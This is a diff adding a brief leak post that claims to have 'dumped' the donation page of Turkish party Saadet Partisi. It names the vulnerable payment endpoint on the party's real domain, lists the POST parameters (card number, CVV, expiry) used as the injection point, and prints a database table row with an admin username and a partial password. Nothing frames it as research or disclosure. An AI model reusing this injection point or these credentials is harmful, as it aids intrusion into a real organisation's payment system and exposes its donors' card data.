@@ -1,0 +1,12 @@
+SAADET PARTISI BAĞIŞ SAYFASI DUMPED
+
+VULN URL-POST : https://bagis.saadet.org.tr/odeme_tamamla.php POST: aciklama=1&ad=0&kart_ay=1&kart_cvv=1&kart_isim=1&kart_no=1&kart_yil=2021&soyad=1&telefon=555-666-0606&tutar=10&tutar_select=50
+
+Database: bagis_banka
+Table: kullanici
+[1 entry]
++----+-------+-------+-------+---------+
+| id | isim  | kad   | email | sifre   |
++----+-------+-------+-------+---------+
+| 1  | Admin | admin | admin | sp987.. |
++----+-------+-------+-------+---------+
